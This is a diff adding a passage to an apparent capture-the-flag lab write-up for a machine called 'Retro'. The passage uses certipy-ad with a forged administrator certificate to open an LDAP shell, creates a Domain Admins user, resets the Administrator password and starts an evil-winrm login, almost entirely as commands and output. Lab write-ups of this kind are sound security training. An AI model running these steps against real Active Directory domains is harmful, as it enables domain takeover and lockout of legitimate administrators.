@@ -407,6 +407,79 @@ File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save w
 
 Now we use the certificate and private key saved at administrator.pfx to retrieve the RC4 hash of the Administrator user:
 
+````
+certipy-ad auth -pfx 'administrator.pfx' -username 'administrator' -domain 'retro.vl' -dc-ip 10.129.234.44
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Using principal: 'administrator@retro.vl'
+[*] Trying to get TGT...
+[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+[-] Use -debug to print a stacktrace
+[-] See the wiki for more information
+
+````
+There seems to be a problem, we cannot use kerberos for this. I did some research and seems to be a problem interaction between certipy v5.1.0 and the version of kerberos used here. We'll have to try another way. Let's use ldap:
+````
+└─$ certipy-ad auth -pfx administrator.pfx -username administrator -domain retro.vl -dc-ip 10.129.234.44 -ldap-shell
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator'
+[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
+[*] Connecting to 'ldaps://10.129.234.44:636'
+[*] Authenticated to '10.129.234.44' as: 'u:RETRO\\Administrator'
+Type help for list of commands
+
+# help
+
+ add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
+ rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
+ add_user new_user [parent] - Creates a new user.
+ add_user_to_group user group - Adds a user to a group.
+ change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
+ clear_rbcd target - Clear the resource based constrained delegation configuration information.
+ clear_shadow_creds target - Clear shadow credentials on the target (sAMAccountName).
+ disable_account user - Disable the user's account.
+ enable_account user - Enable the user's account.
+ dump - Dumps the domain.
+ search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
+ get_user_groups user - Retrieves all groups this user is a member of.
+ get_group_users group - Retrieves all members of a group.
+ get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
+ grant_control [search_base] target grantee - Grant full control on a given target object (sAMAccountName or search filter, optional search base) to the grantee (sAMAccountName).
+ set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
+ set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
+set_shadow_creds target - Set shadow credentials on the target object (sAMAccountName).
+ start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
+ write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
+ whoami - get connected user
+ dirsync - Dirsync requested attributes
+ exit - Terminates this session.
+
+# whoami
+u:RETRO\Administrator
+````
+
+Ok, we managed to get a ldap shell as administrator. This is actually better than the orignal alternative. Now we can create a new user and add it to the administrators group or ever change administrator's password:
+````
+# add_user spaz
+Attempting to create user in: %s CN=Users,DC=retro,DC=vl
+Adding new user with username: spaz and password: !v8zvmkf60xf6A= result: OK
+
+# add_user_to_group spaz "Domain Admins"
+Adding user: spaz to group Domain Admins result: OK
+
+# change_password administrator NewPassword123!
+Got User DN: CN=Administrator,CN=Users,DC=retro,DC=vl
+Attempting to set new password of: NewPassword123!
+Password changed successfully!
+````
+Administrator's new password is: NewPassword123!, now just login via evilwin-rm!
 
 ````
 └─$ evil-winrm -i retro.vl -u administrator -p NewPassword123!    
